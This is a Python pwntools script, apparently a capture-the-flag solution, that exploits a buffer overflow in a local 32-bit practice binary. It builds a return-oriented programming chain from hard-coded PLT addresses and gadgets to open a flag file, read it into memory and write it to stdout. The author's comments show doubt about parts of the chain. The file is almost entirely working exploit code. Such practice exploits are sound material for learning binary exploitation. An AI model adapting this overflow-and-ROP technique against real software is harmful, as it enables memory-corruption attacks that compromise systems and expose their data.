#!/usr/bin/env python

from pwn import *
import os

p = process("./rop-2-32")

buf = "A" * 0x88 + "BBBB"

'''
p = process("./rop-2-xx")
context.terminal = ["tmux", "splitw", "-h"]
gdb.attach(p)
'''


"""
0x08048380  read@plt
0x080483b0  open@plt
0x080483d0  write@plt
0x08048390  printf@plt
"""

open_fun = p32(0x080483b0)
read_fun = p32(0x08048380)
write_fun = p32(0x080483d0)
printf_fun = p32(0x08048390)


'''
0x0804853a : pop ebp ; cld ; leave ; ret
0x08048626 : pop ebp ; lea esp, [ecx - 4] ; ret
0x0804868b : pop ebp ; ret
0x08048688 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048369 : pop ebx ; ret
0x08048625 : pop ecx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x0804868a : pop edi ; pop ebp ; ret
0x08048689 : pop esi ; pop edi ; pop ebp ; ret
0x08048628 : popal ; cld ; ret
'''


flag_symlink = p32(0x8048028)



pop_3_ret = p32(0x08048689)




buf += open_fun
buf += pop_3_ret
#symlink to flag or flag itself?
buf += flag_symlink
buf += p32(0x0)
buf += p32(0x0)

#this is the wrong part?
global_variable_addr = p32(0x804a800)

buf += read_fun
buf += pop_3_ret
buf += p32(3)
#symlink to flag?
buf += global_variable_addr
buf += p32(100)



buf += write_fun
buf += "AAAA"
buf += p32(1)
#symlinnk to a writable file I controll?
buf += global_variable_addr
buf += p32(100)



p.sendline(buf)
p.interactive()